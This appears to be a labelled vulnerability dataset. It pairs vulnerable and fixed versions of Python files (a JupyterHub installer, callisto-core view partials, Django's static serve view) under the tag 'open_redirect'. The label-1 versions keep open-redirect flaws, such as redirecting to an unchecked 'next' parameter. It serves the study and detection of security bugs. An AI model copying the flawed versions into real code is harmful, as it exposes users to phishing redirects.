def ensure_jupyterhub_package(prefix):
    """"""
    Install JupyterHub into our conda environment if needed.

    We install all python packages from PyPI as much as possible in the
    hub environment. A lot of spawners & authenticators do not have conda-forge
    packages, but do have pip packages. Keeping all python packages in the
    hub environment be installed with pip prevents accidental mixing of python
    and conda packages!
    """"""
    conda.ensure_pip_packages(prefix, [
        'jupyterhub==0.9.4',
        'jupyterhub-dummyauthenticator==0.3.1',
        'jupyterhub-systemdspawner==0.11',
        'jupyterhub-firstuseauthenticator==0.12',
        'jupyterhub-nativeauthenticator==0.0.4',
        'jupyterhub-ldapauthenticator==1.2.2',
        'oauthenticator==0.8.0'
    ])
    traefik.ensure_traefik_binary(prefix)


def ensure_usergroups():
    """"""
    Sets up user groups & sudo rules
    """"""
    user.ensure_group('jupyterhub-admins')
    user.ensure_group('jupyterhub-users')

    logger.info(""Granting passwordless sudo to JupyterHub admins..."")
    with open('/etc/sudoers.d/jupyterhub-admins', 'w') as f:
        # JupyterHub admins should have full passwordless sudo access
        f.write('%jupyterhub-admins ALL = (ALL) NOPASSWD: ALL\n')
        # `sudo -E` should preserve the $PATH we set. This allows
        # admins in jupyter terminals to do `sudo -E pip install <package>`,
        # `pip` is in the $PATH we set in jupyterhub_config.py to include the user conda env.
        f.write('Defaults exempt_group = jupyterhub-admins\n')


def ensure_user_environment(user_requirements_txt_file):
    """"""
    Set up user conda environment with required packages
    """"""
    logger.info(""Setting up user environment..."")
    miniconda_version = '4.5.4'
    miniconda_installer_md5 = ""a946ea1d0c4a642ddf0c3a26a18bb16d""

    if not conda.check_miniconda_version(USER_ENV_PREFIX, miniconda_version):
        logger.info('Downloading & setting up user environment...')
        with conda.download_miniconda_installer(miniconda_version, miniconda_installer_md5) as installer_path:
            conda.install_miniconda(installer_path, USER_ENV_PREFIX)

    # nbresuse needs psutil, which requires gcc
    apt.install_packages([
        'gcc'
    ])

    conda.ensure_conda_packages(USER_ENV_PREFIX, [
        # Conda's latest version is on conda much more so than on PyPI.
        'conda==4.5.8'
    ])

    conda.ensure_pip_packages(USER_ENV_PREFIX, [
        # JupyterHub + notebook package are base requirements for user environment
        'jupyterhub==0.9.4',
        'notebook==5.7.0',
        # Install additional notebook frontends!
        'jupyterlab==0.35.3',
        'nteract-on-jupyter==1.9.12',
        # nbgitpuller for easily pulling in Git repositories
        'nbgitpuller==0.6.1',
        # nbresuse to show people how much RAM they are using
        'nbresuse==0.3.0',
        # Most people consider ipywidgets to be part of the core notebook experience
        'ipywidgets==7.4.2',
        # Pin tornado
        'tornado<6.0'
    ])

    if user_requirements_txt_file:
        # FIXME: This currently fails hard, should fail soft and not abort installer
        conda.ensure_pip_requirements(USER_ENV_PREFIX, user_requirements_txt_file)


def ensure_admins(admins):
    """"""
    Setup given list of users as admins.
    """"""
    if not admins:
        return
    logger.info(""Setting up admin users"")
    config_path = CONFIG_FILE
    if os.path.exists(config_path):
        with open(config_path, 'r') as f:
            config = yaml.load(f)
    else:
        config = {}

    config['users'] = config.get('users', {})
    config['users']['admin'] = list(admins)

    with open(config_path, 'w+') as f:
        yaml.dump(config, f)


def ensure_jupyterhub_running(times=20):
    """"""
    Ensure that JupyterHub is up and running

    Loops given number of times, waiting a second each.
    """"""

    for i in range(times):
        try:
            logger.info('Waiting for JupyterHub to come up ({}/{} tries)'.format(i + 1, times))
            urlopen('http://127.0.0.1')
            return
        except HTTPError as h:
            if h.code in [404, 502, 503]:
                # May be transient
                time.sleep(1)
                continue
            # Everything else should immediately abort
            raise
        except URLError as e:
            if isinstance(e.reason, ConnectionRefusedError):
                # Hub isn't up yet, sleep & loop
                time.sleep(1)
                continue
            # Everything else should immediately abort
            raise

    raise Exception(""Installation failed: JupyterHub did not start in {}s"".format(times))


def ensure_symlinks(prefix):
    """"""
    Ensure we symlink appropriate things into /usr/bin

    We add the user conda environment to PATH for notebook terminals,
    but not the hub venv. This means tljh-config is not actually accessible.

    We symlink to /usr/bin and not /usr/local/bin, since /usr/local/bin is
    not place, and works with sudo -E in sudo's search $PATH. We can work
    around this with sudo -E and extra entries in the sudoers file, but this
    is far more secure at the cost of upsetting some FHS purists.
    """"""
    tljh_config_src = os.path.join(prefix, 'bin', 'tljh-config')
    tljh_config_dest = '/usr/bin/tljh-config'
    if os.path.exists(tljh_config_dest):
        if os.path.realpath(tljh_config_dest) != tljh_config_src:
            #  tljh-config exists that isn't ours. We should *not* delete this file,
            # instead we throw an error and abort. Deleting files owned by other people
            # while running as root is dangerous, especially with symlinks involved.
            raise FileExistsError(f'/usr/bin/tljh-config exists but is not a symlink to {tljh_config_src}')
        else:
            # We have a working symlink, so do nothing
            return
    os.symlink(tljh_config_src, tljh_config_dest)


def setup_plugins(plugins=None):
    """"""
    Install plugins & setup a pluginmanager
    """"""
    # Install plugins
    if plugins:
        conda.ensure_pip_packages(HUB_ENV_PREFIX, plugins)

    # Set up plugin infrastructure
    pm = pluggy.PluginManager('tljh')
    pm.add_hookspecs(hooks)
    pm.load_setuptools_entrypoints('tljh')

    return pm


def run_plugin_actions(plugin_manager, plugins):
    """"""
    Run installer hooks defined in plugins
    """"""
    hook = plugin_manager.hook
    # Install apt packages
    apt_packages = list(set(itertools.chain(*hook.tljh_extra_apt_packages())))
    if apt_packages:
        logger.info('Installing {} apt packages collected from plugins: {}'.format(
            len(apt_packages), ' '.join(apt_packages)
        ))
        apt.install_packages(apt_packages)

    # Install conda packages
    conda_packages = list(set(itertools.chain(*hook.tljh_extra_user_conda_packages())))
    if conda_packages:
        logger.info('Installing {} conda packages collected from plugins: {}'.format(
            len(conda_packages), ' '.join(conda_packages)
        ))
        conda.ensure_conda_packages(USER_ENV_PREFIX, conda_packages)

    # Install pip packages
    pip_packages = list(set(itertools.chain(*hook.tljh_extra_user_pip_packages())))
    if pip_packages:
        logger.info('Installing {} pip packages collected from plugins: {}'.format(
            len(pip_packages), ' '.join(pip_packages)
        ))
        conda.ensure_pip_packages(USER_ENV_PREFIX, pip_packages)


def ensure_config_yaml(plugin_manager):
    """"""
    Ensure we have a config.yaml present
    """"""
    # ensure config dir exists and is private
    for path in [CONFIG_DIR, os.path.join(CONFIG_DIR, 'jupyterhub_config.d')]:
        os.makedirs(path, mode=0o700, exist_ok=True)

    migrator.migrate_config_files()

    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            config = yaml.load(f)
    else:
        config = {}

    hook = plugin_manager.hook
    hook.tljh_config_post_install(config=config)

    with open(CONFIG_FILE, 'w+') as f:
        yaml.dump(config, f)


def main():
    from .log import init_logging
    init_logging()

    argparser = argparse.ArgumentParser()
    argparser.add_argument(
        '--admin',
        nargs='*',
        help='List of usernames set to be admin'
    )
    argparser.add_argument(
        '--user-requirements-txt-url',
        help='URL to a requirements.txt file that should be installed in the user enviornment'
    )
    argparser.add_argument(
        '--plugin',
        nargs='*',
        help='Plugin pip-specs to install'
    )

    args = argparser.parse_args()

    pm = setup_plugins(args.plugin)

    ensure_config_yaml(pm)
    ensure_admins(args.admin)
    ensure_usergroups()
    ensure_user_environment(args.user_requirements_txt_url)

    logger.info(""Setting up JupyterHub..."")
    ensure_node()
    ensure_jupyterhub_package(HUB_ENV_PREFIX)
    ensure_jupyterlab_extensions()
    ensure_jupyterhub_service(HUB_ENV_PREFIX)
    ensure_jupyterhub_running()
    ensure_symlinks(HUB_ENV_PREFIX)

    # Run installer plugins last
    run_plugin_actions(pm, args.plugin)

    logger.info(""Done!"")


if __name__ == '__main__':
    main()
/n/n/n",1,open_redirect
14,150,76755bbf0ffaf425f481f18ab2f5cda23581bcad,"callisto_core/delivery/view_partials.py/n/n""""""

View partials provide all the callisto-core front-end functionality.
Subclass these partials with your own views if you are implementing
callisto-core. Many of the view partials only provide a subset of the
functionality required for a full HTML view.

docs / reference:
    - https://docs.djangoproject.com/en/1.11/topics/class-based-views/
    - https://github.com/project-callisto/callisto-core/blob/master/callisto_core/wizard_builder/view_partials.py

view_partials should define:
    - forms
    - models
    - helper classes
    - access checks
    - redirect handlers

and should not define:
    - templates
    - url names

""""""
import logging
import re

import ratelimit.mixins
from nacl.exceptions import CryptoError

from django.conf import settings
from django.core.exceptions import PermissionDenied
from django.http import HttpResponse
from django.shortcuts import redirect
from django.urls import reverse, reverse_lazy
from django.views import generic as views
from django.utils.http import is_safe_url

from callisto_core.evaluation.view_partials import EvalDataMixin
from callisto_core.reporting import report_delivery
from callisto_core.wizard_builder import (
    data_helper,
    view_partials as wizard_builder_partials,
)

from . import forms, models, view_helpers

logger = logging.getLogger(__name__)


#######################
# secret key partials #
#######################


class _PassphrasePartial(views.base.TemplateView):
    storage_helper = view_helpers.ReportStorageHelper

    @property
    def storage(self):
        return self.storage_helper(self)


class _PassphraseClearingPartial(EvalDataMixin, _PassphrasePartial):
    def get(self, request, *args, **kwargs):
        self.storage.clear_passphrases()
        return super().get(request, *args, **kwargs)


class DashboardPartial(_PassphraseClearingPartial):
    EVAL_ACTION_TYPE = ""DASHBOARD""


###################
# report partials #
###################


class ReportBasePartial(EvalDataMixin, wizard_builder_partials.WizardFormPartial):
    model = models.Report
    storage_helper = view_helpers.EncryptedReportStorageHelper
    EVAL_ACTION_TYPE = ""VIEW""

    @property
    def site_id(self):
        # TODO: remove
        return self.request.site.id

    @property
    def decrypted_report(self):
        return self.report.decrypt_record(self.storage.passphrase)

    def get_form_kwargs(self):
        kwargs = super().get_form_kwargs()
        kwargs.update({""view"": self})  # TODO: remove
        return kwargs


class ReportCreatePartial(ReportBasePartial, views.edit.CreateView):
    form_class = forms.ReportCreateForm
    EVAL_ACTION_TYPE = ""CREATE""

    def get_success_url(self):
        return reverse(self.success_url, kwargs={""step"": 0, ""uuid"": self.object.uuid})


class _ReportDetailPartial(ReportBasePartial, views.detail.DetailView):
    context_object_name = ""report""
    slug_field = ""uuid""
    slug_url_kwarg = ""uuid""

    @property
    def report(self):
        # TODO: remove, use self.object
        return self.get_object()


class _ReportLimitedDetailPartial(
    _ReportDetailPartial, ratelimit.mixins.RatelimitMixin
):
    ratelimit_key = ""user""
    ratelimit_rate = settings.DECRYPT_THROTTLE_RATE


class _ReportAccessPartial(_ReportLimitedDetailPartial):
    invalid_access_key_message = ""Invalid key in access request""
    invalid_access_user_message = ""Invalid user in access request""
    invalid_access_no_key_message = ""No key in access request""
    form_class = forms.ReportAccessForm
    access_form_class = forms.ReportAccessForm

    @property
    def access_granted(self):
        self._check_report_owner()
        try:
            passphrase = self.request.POST[""key""]
        except Exception:
            return False

        if passphrase:
            try:
                self.storage.report.decrypt_record(passphrase)
                return True
            except CryptoError:
                logger.warn(self.invalid_access_key_message)
                return False
        else:
            logger.info(self.invalid_access_no_key_message)
            return False

    @property
    def access_form_valid(self):
        form = self._get_access_form()
        if form.is_valid():
            form.save()
            return True
        else:
            return False

    def _passphrase_next_url(self, request):
        next_url = None
        if ""next"" in request.GET:
            if re.search(r""^/[\W/-]*"", request.GET[""next""]):
                if is_safe_url(request.GET[""next""]):
                    next_url = request.GET[""next""]
        return next_url

    def dispatch(self, request, *args, **kwargs):
        logger.debug(f""{self.__class__.__name__} access check"")

        if (
            self.access_granted or self.access_form_valid
        ) and self._passphrase_next_url(request):
            return self._redirect_from_passphrase(request)
        elif self.access_granted or self.access_form_valid:
            return super().dispatch(request, *args, **kwargs)
        else:
            return self._render_access_form()

    def _get_access_form(self):
        form_kwargs = self.get_form_kwargs()
        form_kwargs.update({""instance"": self.get_object()})
        return self.access_form_class(**form_kwargs)

    def _render_access_form(self):
        self.object = self.report
        self.template_name = self.access_template_name
        context = self.get_context_data(form=self._get_access_form())
        return self.render_to_response(context)

    def _redirect_from_passphrase(self, request):
        return redirect(self._passphrase_next_url(request))

    def _check_report_owner(self):
        if not self.report.owner == self.request.user:
            logger.warn(self.invalid_access_user_message)
            raise PermissionDenied


class _ReportUpdatePartial(_ReportAccessPartial, views.edit.UpdateView):
    back_url = None

    @property
    def report(self):
        # TODO: remove, use self.object
        return self.get_object()


###################
# wizard partials #
###################


class EncryptedWizardPartial(
    _ReportUpdatePartial, wizard_builder_partials.WizardPartial
):
    steps_helper = view_helpers.ReportStepsHelper
    EVAL_ACTION_TYPE = ""EDIT""

    def dispatch(self, request, *args, **kwargs):
        self._dispatch_processing()
        return super().dispatch(request, *args, **kwargs)

    def _rendering_done_hook(self):
        self.eval_action(""REVIEW"")


###################
# report actions  #
###################


class _ReportActionPartial(_ReportUpdatePartial):
    success_url = reverse_lazy(""dashboard"")

    def form_valid(self, form):
        logger.debug(f""{self.__class__.__name__} form valid"")
        output = super().form_valid(form)
        self.view_action()
        return output

    def form_invalid(self, form):
        return super().form_invalid(form)

    def view_action(self):
        pass


class ReportDeletePartial(_ReportActionPartial):
    EVAL_ACTION_TYPE = ""DELETE""

    def view_action(self):
        self.report.delete()


class WizardPDFPartial(_ReportActionPartial):
    EVAL_ACTION_TYPE = ""ACCESS_PDF""

    def form_valid(self, form):
        # remove the old PDF generator completely.
        # this should be generated via JS now.
        pass


class ViewPDFPartial(WizardPDFPartial):
    content_disposition = ""inline""
    EVAL_ACTION_TYPE = ""VIEW_PDF""


class DownloadPDFPartial(WizardPDFPartial):
    content_disposition = ""attachment""
    EVAL_ACTION_TYPE = ""DOWNLOAD_PDF""
/n/n/n",0,open_redirect
15,151,76755bbf0ffaf425f481f18ab2f5cda23581bcad,"/callisto_core/delivery/view_partials.py/n/n""""""

View partials provide all the callisto-core front-end functionality.
Subclass these partials with your own views if you are implementing
callisto-core. Many of the view partials only provide a subset of the
functionality required for a full HTML view.

docs / reference:
    - https://docs.djangoproject.com/en/1.11/topics/class-based-views/
    - https://github.com/project-callisto/callisto-core/blob/master/callisto_core/wizard_builder/view_partials.py

view_partials should define:
    - forms
    - models
    - helper classes
    - access checks
    - redirect handlers

and should not define:
    - templates
    - url names

""""""
import logging
import re

import ratelimit.mixins
from nacl.exceptions import CryptoError

from django.conf import settings
from django.core.exceptions import PermissionDenied
from django.http import HttpResponse
from django.shortcuts import redirect
from django.urls import reverse, reverse_lazy
from django.views import generic as views

from callisto_core.evaluation.view_partials import EvalDataMixin
from callisto_core.reporting import report_delivery
from callisto_core.wizard_builder import (
    data_helper,
    view_partials as wizard_builder_partials,
)

from . import forms, models, view_helpers

logger = logging.getLogger(__name__)


#######################
# secret key partials #
#######################


class _PassphrasePartial(views.base.TemplateView):
    storage_helper = view_helpers.ReportStorageHelper

    @property
    def storage(self):
        return self.storage_helper(self)


class _PassphraseClearingPartial(EvalDataMixin, _PassphrasePartial):
    def get(self, request, *args, **kwargs):
        self.storage.clear_passphrases()
        return super().get(request, *args, **kwargs)


class DashboardPartial(_PassphraseClearingPartial):
    EVAL_ACTION_TYPE = ""DASHBOARD""


###################
# report partials #
###################


class ReportBasePartial(EvalDataMixin, wizard_builder_partials.WizardFormPartial):
    model = models.Report
    storage_helper = view_helpers.EncryptedReportStorageHelper
    EVAL_ACTION_TYPE = ""VIEW""

    @property
    def site_id(self):
        # TODO: remove
        return self.request.site.id

    @property
    def decrypted_report(self):
        return self.report.decrypt_record(self.storage.passphrase)

    def get_form_kwargs(self):
        kwargs = super().get_form_kwargs()
        kwargs.update({""view"": self})  # TODO: remove
        return kwargs


class ReportCreatePartial(ReportBasePartial, views.edit.CreateView):
    form_class = forms.ReportCreateForm
    EVAL_ACTION_TYPE = ""CREATE""

    def get_success_url(self):
        return reverse(self.success_url, kwargs={""step"": 0, ""uuid"": self.object.uuid})


class _ReportDetailPartial(ReportBasePartial, views.detail.DetailView):
    context_object_name = ""report""
    slug_field = ""uuid""
    slug_url_kwarg = ""uuid""

    @property
    def report(self):
        # TODO: remove, use self.object
        return self.get_object()


class _ReportLimitedDetailPartial(
    _ReportDetailPartial, ratelimit.mixins.RatelimitMixin
):
    ratelimit_key = ""user""
    ratelimit_rate = settings.DECRYPT_THROTTLE_RATE


class _ReportAccessPartial(_ReportLimitedDetailPartial):
    invalid_access_key_message = ""Invalid key in access request""
    invalid_access_user_message = ""Invalid user in access request""
    invalid_access_no_key_message = ""No key in access request""
    form_class = forms.ReportAccessForm
    access_form_class = forms.ReportAccessForm

    @property
    def access_granted(self):
        self._check_report_owner()
        try:
            passphrase = self.request.POST[""key""]
        except Exception:
            return False

        if passphrase:
            try:
                self.storage.report.decrypt_record(passphrase)
                return True
            except CryptoError:
                logger.warn(self.invalid_access_key_message)
                return False
        else:
            logger.info(self.invalid_access_no_key_message)
            return False

    @property
    def access_form_valid(self):
        form = self._get_access_form()
        if form.is_valid():
            form.save()
            return True
        else:
            return False

    def _passphrase_next_url(self, request):
        next_url = None
        if ""next"" in request.GET:
            if re.search(r""^/[\W/-]*"", request.GET[""next""]):
                next_url = request.GET[""next""]
        return next_url

    def dispatch(self, request, *args, **kwargs):
        logger.debug(f""{self.__class__.__name__} access check"")

        if (
            self.access_granted or self.access_form_valid
        ) and self._passphrase_next_url(request):
            return self._redirect_from_passphrase(request)
        elif self.access_granted or self.access_form_valid:
            return super().dispatch(request, *args, **kwargs)
        else:
            return self._render_access_form()

    def _get_access_form(self):
        form_kwargs = self.get_form_kwargs()
        form_kwargs.update({""instance"": self.get_object()})
        return self.access_form_class(**form_kwargs)

    def _render_access_form(self):
        self.object = self.report
        self.template_name = self.access_template_name
        context = self.get_context_data(form=self._get_access_form())
        return self.render_to_response(context)

    def _redirect_from_passphrase(self, request):
        return redirect(self._passphrase_next_url(request))

    def _check_report_owner(self):
        if not self.report.owner == self.request.user:
            logger.warn(self.invalid_access_user_message)
            raise PermissionDenied


class _ReportUpdatePartial(_ReportAccessPartial, views.edit.UpdateView):
    back_url = None

    @property
    def report(self):
        # TODO: remove, use self.object
        return self.get_object()


###################
# wizard partials #
###################


class EncryptedWizardPartial(
    _ReportUpdatePartial, wizard_builder_partials.WizardPartial
):
    steps_helper = view_helpers.ReportStepsHelper
    EVAL_ACTION_TYPE = ""EDIT""

    def dispatch(self, request, *args, **kwargs):
        self._dispatch_processing()
        return super().dispatch(request, *args, **kwargs)

    def _rendering_done_hook(self):
        self.eval_action(""REVIEW"")


###################
# report actions  #
###################


class _ReportActionPartial(_ReportUpdatePartial):
    success_url = reverse_lazy(""dashboard"")

    def form_valid(self, form):
        logger.debug(f""{self.__class__.__name__} form valid"")
        output = super().form_valid(form)
        self.view_action()
        return output

    def form_invalid(self, form):
        return super().form_invalid(form)

    def view_action(self):
        pass


class ReportDeletePartial(_ReportActionPartial):
    EVAL_ACTION_TYPE = ""DELETE""

    def view_action(self):
        self.report.delete()


class WizardPDFPartial(_ReportActionPartial):
    EVAL_ACTION_TYPE = ""ACCESS_PDF""

    def form_valid(self, form):
        # remove the old PDF generator completely.
        # this should be generated via JS now.
        pass


class ViewPDFPartial(WizardPDFPartial):
    content_disposition = ""inline""
    EVAL_ACTION_TYPE = ""VIEW_PDF""


class DownloadPDFPartial(WizardPDFPartial):
    content_disposition = ""attachment""
    EVAL_ACTION_TYPE = ""DOWNLOAD_PDF""
/n/n/n",1,open_redirect
16,4,a1f948b468b6621083a03b0d53432341b7a4d753,"django/views/static.py/n/n""""""
Views and functions for serving static files. These are only to be used
during development, and SHOULD NOT be used in a production setting.
""""""
import mimetypes
import os
import posixpath
import re
import stat

from django.http import (
    FileResponse, Http404, HttpResponse, HttpResponseNotModified,
)
from django.template import Context, Engine, TemplateDoesNotExist, loader
from django.utils._os import safe_join
from django.utils.http import http_date, parse_http_date
from django.utils.translation import gettext as _, gettext_lazy


def serve(request, path, document_root=None, show_indexes=False):
    """"""
    Serve static files below a given point in the directory structure.

    To use, put a URL pattern such as::

        from django.views.static import serve

        url(r'^(?P<path>.*)$', serve, {'document_root': '/path/to/my/files/'})

    in your URLconf. You must provide the ``document_root`` param. You may
    also set ``show_indexes`` to ``True`` if you'd like to serve a basic index
    of the directory.  This index view will use the template hardcoded below,
    but if you'd like to override it, you can create a template called
    ``static/directory_index.html``.
    """"""
    path = posixpath.normpath(path).lstrip('/')
    fullpath = safe_join(document_root, path)
    if os.path.isdir(fullpath):
        if show_indexes:
            return directory_index(path, fullpath)
        raise Http404(_(""Directory indexes are not allowed here.""))
    if not os.path.exists(fullpath):
        raise Http404(_('""%(path)s"" does not exist') % {'path': fullpath})
    # Respect the If-Modified-Since header.
    statobj = os.stat(fullpath)
    if not was_modified_since(request.META.get('HTTP_IF_MODIFIED_SINCE'),
                              statobj.st_mtime, statobj.st_size):
        return HttpResponseNotModified()
    content_type, encoding = mimetypes.guess_type(fullpath)
    content_type = content_type or 'application/octet-stream'
    response = FileResponse(open(fullpath, 'rb'), content_type=content_type)
    response[""Last-Modified""] = http_date(statobj.st_mtime)
    if stat.S_ISREG(statobj.st_mode):
        response[""Content-Length""] = statobj.st_size
    if encoding:
        response[""Content-Encoding""] = encoding
    return response


DEFAULT_DIRECTORY_INDEX_TEMPLATE = """"""
{% load i18n %}
<!DOCTYPE html>
<html lang=""en"">
  <head>
    <meta http-equiv=""Content-type"" content=""text/html; charset=utf-8"" />
    <meta http-equiv=""Content-Language"" content=""en-us"" />
    <meta name=""robots"" content=""NONE,NOARCHIVE"" />
    <title>{% blocktrans %}Index of {{ directory }}{% endblocktrans %}</title>
  </head>
  <body>
    <h1>{% blocktrans %}Index of {{ directory }}{% endblocktrans %}</h1>
    <ul>
      {% if directory != ""/"" %}
      <li><a href=""../"">../</a></li>
      {% endif %}
      {% for f in file_list %}
      <li><a href=""{{ f|urlencode }}"">{{ f }}</a></li>
      {% endfor %}
    </ul>
  </body>
</html>
""""""
template_translatable = gettext_lazy(""Index of %(directory)s"")


def directory_index(path, fullpath):
    try:
        t = loader.select_template([
            'static/directory_index.html',
            'static/directory_index',
        ])
    except TemplateDoesNotExist:
        t = Engine(libraries={'i18n': 'django.templatetags.i18n'}).from_string(DEFAULT_DIRECTORY_INDEX_TEMPLATE)
    files = []
    for f in os.listdir(fullpath):
        if not f.startswith('.'):
            if os.path.isdir(os.path.join(fullpath, f)):
                f += '/'
            files.append(f)
    c = Context({
        'directory': path + '/',
        'file_list': files,
    })
    return HttpResponse(t.render(c))


def was_modified_since(header=None, mtime=0, size=0):
    """"""
    Was something modified since the user last downloaded it?

    header
      This is the value of the If-Modified-Since header.  If this is None,
      I'll just return True.

    mtime
      This is the modification time of the item we're talking about.

    size
      This is the size of the item we're talking about.
    """"""
    try:
        if header is None:
            raise ValueError
        matches = re.match(r""^([^;]+)(; length=([0-9]+))?$"", header,
                           re.IGNORECASE)
        header_mtime = parse_http_date(matches.group(1))
        header_len = matches.group(3)
        if header_len and int(header_len) != size:
            raise ValueError
        if int(mtime) > header_mtime:
            raise ValueError
    except (AttributeError, ValueError, OverflowError):
        return True
    return False
/n/n/ntests/view_tests/tests/test_static.py/n/nimport mimetypes
import unittest
from os import path
from urllib.parse import quote

from django.conf.urls.static import static
from django.core.exceptions import ImproperlyConfigured
from django.http import FileResponse, HttpResponseNotModified
from django.test import SimpleTestCase, override_settings
from django.utils.http import http_date
from django.views.static import was_modified_since

from .. import urls
from ..urls import media_dir


@override_settings(DEBUG=True, ROOT_URLCONF='view_tests.urls')
class StaticTests(SimpleTestCase):
    """"""Tests django views in django/views/static.py""""""

    prefix = 'site_media'

    def test_serve(self):
        ""The static view can serve static media""
        media_files = ['file.txt', 'file.txt.gz', '%2F.txt']
        for filename in media_files:
            response = self.client.get('/%s/%s' % (self.prefix, quote(filename)))
            response_content = b''.join(response)
            file_path = path.join(media_dir, filename)
            with open(file_path, 'rb') as fp:
                self.assertEqual(fp.read(), response_content)
            self.assertEqual(len(response_content), int(response['Content-Length']))
            self.assertEqual(mimetypes.guess_type(file_path)[1], response.get('Content-Encoding', None))

    def test_chunked(self):
        ""The static view should stream files in chunks to avoid large memory usage""
        response = self.client.get('/%s/%s' % (self.prefix, 'long-line.txt'))
        first_chunk = next(response.streaming_content)
        self.assertEqual(len(first_chunk), FileResponse.block_size)
        second_chunk = next(response.streaming_content)
        response.close()
        # strip() to prevent OS line endings from causing differences
        self.assertEqual(len(second_chunk.strip()), 1449)

    def test_unknown_mime_type(self):
        response = self.client.get('/%s/file.unknown' % self.prefix)
        self.assertEqual('application/octet-stream', response['Content-Type'])
        response.close()

    def test_copes_with_empty_path_component(self):
        file_name = 'file.txt'
        response = self.client.get('/%s//%s' % (self.prefix, file_name))
        response_content = b''.join(response)
        with open(path.join(media_dir, file_name), 'rb') as fp:
            self.assertEqual(fp.read(), response_content)

    def test_is_modified_since(self):
        file_name = 'file.txt'
        response = self.client.get(
            '/%s/%s' % (self.prefix, file_name),
            HTTP_IF_MODIFIED_SINCE='Thu, 1 Jan 1970 00:00:00 GMT'
        )
        response_content = b''.join(response)
        with open(path.join(media_dir, file_name), 'rb') as fp:
            self.assertEqual(fp.read(), response_content)

    def test_not_modified_since(self):
        file_name = 'file.txt'
        response = self.client.get(
            '/%s/%s' % (self.prefix, file_name),
            HTTP_IF_MODIFIED_SINCE='Mon, 18 Jan 2038 05:14:07 GMT'
            # This is 24h before max Unix time. Remember to fix Django and
            # update this test well before 2038 :)
        )
        self.assertIsInstance(response, HttpResponseNotModified)

    def test_invalid_if_modified_since(self):
        """"""Handle bogus If-Modified-Since values gracefully

        Assume that a file is modified since an invalid timestamp as per RFC
        2616, section 14.25.
        """"""
        file_name = 'file.txt'
        invalid_date = 'Mon, 28 May 999999999999 28:25:26 GMT'
        response = self.client.get('/%s/%s' % (self.prefix, file_name),
                                   HTTP_IF_MODIFIED_SINCE=invalid_date)
        response_content = b''.join(response)
        with open(path.join(media_dir, file_name), 'rb') as fp:
            self.assertEqual(fp.read(), response_content)
        self.assertEqual(len(response_content), int(response['Content-Length']))

    def test_invalid_if_modified_since2(self):
        """"""Handle even more bogus If-Modified-Since values gracefully

        Assume that a file is modified since an invalid timestamp as per RFC
        2616, section 14.25.
        """"""
        file_name = 'file.txt'
        invalid_date = ': 1291108438, Wed, 20 Oct 2010 14:05:00 GMT'
        response = self.client.get('/%s/%s' % (self.prefix, file_name),
                                   HTTP_IF_MODIFIED_SINCE=invalid_date)
        response_content = b''.join(response)
        with open(path.join(media_dir, file_name), 'rb') as fp:
            self.assertEqual(fp.read(), response_content)
        self.assertEqual(len(response_content), int(response['Content-Length']))

    def test_404(self):
        response = self.client.get('/%s/nonexistent_resource' % self.prefix)
        self.assertEqual(404, response.status_code)

    def test_index(self):
        response = self.client.get('/%s/' % self.prefix)
        self.assertContains(response, 'Index of ./')


class StaticHelperTest(StaticTests):
    """"""
    Test case to make sure the static URL pattern helper works as expected
    """"""
    def setUp(self):
        super().setUp()
        self._old_views_urlpatterns = urls.urlpatterns[:]
        urls.urlpatterns += static('/media/', document_root=media_dir)

    def tearDown(self):
        super().tearDown()
        urls.urlpatterns = self._old_views_urlpatterns

    def test_prefix(self):
        self.assertEqual(static('test')[0].regex.pattern, '^test(?P<path>.*)$')

    @override_settings(DEBUG=False)
    def test_debug_off(self):
        """"""No URLs are served if DEBUG=False.""""""
        self.assertEqual(static('test'), [])

    def test_empty_prefix(self):
        with self.assertRaisesMessage(ImproperlyConfigured, 'Empty static prefix not permitted'):
            static('')

    def test_special_prefix(self):
        """"""No URLs are served if prefix contains '://'.""""""
        self.assertEqual(static('http://'), [])


class StaticUtilsTests(unittest.TestCase):
    def test_was_modified_since_fp(self):
        """"""
        A floating point mtime does not disturb was_modified_since (#18675).
        """"""
        mtime = 1343416141.107817
        header = http_date(mtime)
        self.assertFalse(was_modified_since(header, mtime))
/n/n/n",0,open_redirect
17,5,a1f948b468b6621083a03b0d53432341b7a4d753,"/django/views/static.py/n/n""""""
Views and functions for serving static files. These are only to be used
during development, and SHOULD NOT be used in a production setting.
""""""
import mimetypes
import os
import posixpath
import re
import stat

from django.http import (
    FileResponse, Http404, HttpResponse, HttpResponseNotModified,
    HttpResponseRedirect,
)
from django.template import Context, Engine, TemplateDoesNotExist, loader
from django.utils.http import http_date, parse_http_date
from django.utils.translation import gettext as _, gettext_lazy


def serve(request, path, document_root=None, show_indexes=False):
    """"""
    Serve static files below a given point in the directory structure.

    To use, put a URL pattern such as::

        from django.views.static import serve

        url(r'^(?P<path>.*)$', serve, {'document_root': '/path/to/my/files/'})

    in your URLconf. You must provide the ``document_root`` param. You may
    also set ``show_indexes`` to ``True`` if you'd like to serve a basic index
    of the directory.  This index view will use the template hardcoded below,
    but if you'd like to override it, you can create a template called
    ``static/directory_index.html``.
    """"""
    path = posixpath.normpath(path)
    path = path.lstrip('/')
    newpath = ''
    for part in path.split('/'):
        if not part:
            # Strip empty path components.
            continue
        drive, part = os.path.splitdrive(part)
        head, part = os.path.split(part)
        if part in (os.curdir, os.pardir):
            # Strip '.' and '..' in path.
            continue
        newpath = os.path.join(newpath, part).replace('\\', '/')
    if newpath and path != newpath:
        return HttpResponseRedirect(newpath)
    fullpath = os.path.join(document_root, newpath)
    if os.path.isdir(fullpath):
        if show_indexes:
            return directory_index(newpath, fullpath)
        raise Http404(_(""Directory indexes are not allowed here.""))
    if not os.path.exists(fullpath):
        raise Http404(_('""%(path)s"" does not exist') % {'path': fullpath})
    # Respect the If-Modified-Since header.
    statobj = os.stat(fullpath)
    if not was_modified_since(request.META.get('HTTP_IF_MODIFIED_SINCE'),
                              statobj.st_mtime, statobj.st_size):
        return HttpResponseNotModified()
    content_type, encoding = mimetypes.guess_type(fullpath)
    content_type = content_type or 'application/octet-stream'
    response = FileResponse(open(fullpath, 'rb'), content_type=content_type)
    response[""Last-Modified""] = http_date(statobj.st_mtime)
    if stat.S_ISREG(statobj.st_mode):
        response[""Content-Length""] = statobj.st_size
    if encoding:
        response[""Content-Encoding""] = encoding
    return response


DEFAULT_DIRECTORY_INDEX_TEMPLATE = """"""
{% load i18n %}
<!DOCTYPE html>
<html lang=""en"">
  <head>
    <meta http-equiv=""Content-type"" content=""text/html; charset=utf-8"" />
